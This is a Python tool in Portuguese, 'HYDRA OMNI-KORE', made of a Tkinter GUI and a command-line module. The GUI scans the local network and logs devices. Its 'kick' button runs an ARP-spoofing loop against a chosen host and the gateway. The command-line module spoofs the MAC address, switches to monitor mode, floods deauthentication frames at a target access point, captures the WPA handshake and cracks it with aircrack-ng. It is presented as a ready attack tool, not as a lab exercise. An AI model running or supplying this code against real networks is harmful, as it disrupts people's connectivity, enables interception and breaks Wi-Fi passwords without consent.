import tkinter as tk
from tkinter import ttk, messagebox
from scapy.all import ARP, Ether, srp, send, conf, RadioTap, Dot11, Dot11Deauth, Dot11Beacon, EAPOL, wrpcap, sendp, sniff
import threading
import time
import json
import os
import random
from datetime import datetime

# ==========================================
# MÓDULO 1: HYDRA SENTINEL V3 (VIGILÂNCIA & LOGS)
# ==========================================
class HydraSentinelV3:
    def __init__(self, root):
        self.root = root
        self.root.title("HYDRA SENTINEL v3.0 - BLACK BOX EDITION")
        self.root.geometry("1000x700")
        self.root.configure(bg="#050505")
        
        self.attacking = False
        self.target_ip = ""
        self.gateway_ip = "192.168.1.1" 
        self.log_file = "hydra_network_logs.json"
        
        if not os.path.exists(self.log_file):
            with open(self.log_file, "w") as f: json.dump([], f)

        self.style = ttk.Style()
        self.style.theme_use("clam")
        self.style.configure("Treeview", background="#0a0a0a", foreground="white", fieldbackground="#0a0a0a", rowheight=30)
        self.style.map("Treeview", background=[('selected', '#ff0000')])

        header_frame = tk.Frame(root, bg="#050505")
        header_frame.pack(fill="x", pady=10)
        tk.Label(header_frame, text="HYDRA SENTINEL v3.0", font=("Arial", 20, "bold"), bg="#050505", fg="#ff0000").pack()
        
        self.notebook = ttk.Notebook(root)
        self.notebook.pack(pady=10, padx=20, fill="both", expand=True)

        self.frame_active = tk.Frame(self.notebook, bg="#0a0a0a")
        self.notebook.add(self.frame_active, text=" REDE ATIVA ")
        self.tree_active = ttk.Treeview(self.frame_active, columns=("IP", "MAC", "VENDOR", "STATUS"), show="headings")
        for col in ("IP", "MAC", "VENDOR", "STATUS"): self.tree_active.heading(col, text=col)
        self.tree_active.pack(fill="both", expand=True, padx=10, pady=10)

        self.frame_logs = tk.Frame(self.notebook, bg="#0a0a0a")
        self.notebook.add(self.frame_logs, text=" HISTÓRICO (BLACK BOX) ")
        self.tree_logs = ttk.Treeview(self.frame_logs, columns=("DATA", "IP", "MAC", "VENDOR"), show="headings")
        for col in ("DATA", "IP", "MAC", "VENDOR"): self.tree_logs.heading(col, text=col)
        self.tree_logs.pack(fill="both", expand=True, padx=10, pady=10)

        ctrl_frame = tk.Frame(root, bg="#050505")
        ctrl_frame.pack(fill="x", pady=20, padx=20)
        self.scan_btn = tk.Button(ctrl_frame, text="SCANEAR AGORA", command=self.start_scan, bg="#111", fg="#00ff00", width=20)
        self.scan_btn.grid(row=0, column=0, padx=5)
        self.kick_btn = tk.Button(ctrl_frame, text="DERRUBAR INTRUSO (KICK)", command=self.toggle_attack, bg="#ff0000", fg="white", width=25)
        self.kick_btn.grid(row=0, column=1, padx=5)
        
        self.status_bar = tk.Label(root, text="NÚCLEO HYDRA PRONTO", bg="#111", fg="#444")
        self.status_bar.pack(side="bottom", fill="x")
        self.load_logs_to_ui()

    def save_to_log(self, ip, mac, vendor):
        with open(self.log_file, "r") as f: logs = json.load(f)
        new_entry = {"data": datetime.now().strftime("%d/%m/%Y %H:%M:%S"), "ip": ip, "mac": mac, "vendor": vendor}
        logs.append(new_entry)
        with open(self.log_file, "w") as f: json.dump(logs, f, indent=4)

    def load_logs_to_ui(self):
        for i in self.tree_logs.get_children(): self.tree_logs.delete(i)
        with open(self.log_file, "r") as f:
            logs = json.load(f)
            for entry in reversed(logs): self.tree_logs.insert("", "end", values=(entry['data'], entry['ip'], entry['mac'], entry['vendor']))

    def get_vendor(self, mac):
        mac = mac.upper()
        vendors = {"BC:EE:7B": "SAMSUNG", "80:ED:2C": "APPLE", "D8:07:B6": "MOTOROLA", "00:0C:29": "VMWARE", "F4:F5:D8": "GOOGLE"}
        prefix = ":".join(mac.split(":")[:3])
        return vendors.get(prefix, "DESCONHECIDO")

    def start_scan(self):
        self.scan_btn.config(state="disabled", text="ESCANEANDO...")
        for i in self.tree_active.get_children(): self.tree_active.delete(i)
        threading.Thread(target=self.scan_logic, daemon=True).start()

    def scan_logic(self):
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.1/24"), timeout=3, verbose=False)
            for sent, received in ans:
                vendor = self.get_vendor(received.hwsrc)
                self.tree_active.insert("", "end", values=(received.psrc, received.hwsrc, vendor, "ATIVO"))
                self.save_to_log(received.psrc, received.hwsrc, vendor)
            self.load_logs_to_ui()
        finally: self.scan_btn.config(state="normal", text="SCANEAR AGORA")

    def toggle_attack(self):
        selected = self.tree_active.selection()
        if not selected: return
        if self.attacking: self.attacking = False
        else:
            item = self.tree_active.item(selected)
            self.target_ip = item['values'][0]
            self.attacking = True
            threading.Thread(target=self.attack_logic, daemon=True).start()

    def attack_logic(self):
        while self.attacking:
            send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff"), verbose=False)
            send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff"), verbose=False)
            time.sleep(2)

# ==========================================
# MÓDULO 2: HYDRA PHANTOM V5 (WIFI OFFENSE & GHOST)
# ==========================================
class HydraPhantomV5:
    def __init__(self, interface):
        self.interface = interface
        self.target_bssid = ""
        self.handshake_captured = False

    def generate_random_mac(self):
        return "00:%02x:%02x:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

    def ghost_mode(self):
        new_mac = self.generate_random_mac()
        print(f"[GHOST] Alterando identidade para: {new_mac}")
        os.system(f"ip link set {self.interface} down")
        os.system(f"ip link set {self.interface} address {new_mac}")
        os.system(f"ip link set {self.interface} up")

    def set_monitor_mode(self):
        os.system(f"airmon-ng start {self.interface}")
        self.interface = self.interface + "mon"

    def massive_deauth(self):
        print(f"[ATAQUE] Bombardeando BSSID {self.target_bssid}...")
        pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.target_bssid, addr3=self.target_bssid)/Dot11Deauth()
        while not self.handshake_captured:
            sendp(pkt, iface=self.interface, count=64, inter=0.1, verbose=False)

    def sniffer_callback(self, pkt):
        if pkt.haslayer(EAPOL):
            print(f"\n[SUCESSO] HANDSHAKE CAPTURADO!")
            wrpcap("hydra_target.cap", pkt, append=True)
            self.handshake_captured = True

    def run_crack(self, wordlist_path):
        os.system(f"aircrack-ng hydra_target.cap -w {wordlist_path}")

# ==========================================
# INICIALIZADOR MESTRE
# ==========================================
if __name__ == "__main__":
    print("--- HYDRA OMNI-KORE v7.0 ---")
    print("Operador: Dionathan Martins")
    print("\n[1] Módulo Sentinel (Vigilância GUI)")
    print("[2] Módulo Phantom (Wi-Fi Attack CLI)")
    
    escolha = input("\nSELECIONE O MÓDULO > ")

    if escolha == "1":
        root = tk.Tk()
        app = HydraSentinelV3(root)
        root.mainloop()
    
    elif escolha == "2":
        iface = input("Interface Wi-Fi (ex: wlan0): ")
        phantom = HydraPhantomV5(iface)
        phantom.ghost_mode()
        phantom.set_monitor_mode()
        phantom.target_bssid = input("BSSID Alvo: ")
        
        print("[SISTEMA] Iniciando captura de Handshake...")
        t = threading.Thread(target=phantom.massive_deauth)
        t.start()
        
        sniff(iface=phantom.interface, prn=phantom.sniffer_callback, stop_filter=lambda x: phantom.handshake_captured)
        
        wlist = input("Caminho da Wordlist: ")
        phantom.run_crack(wlist)
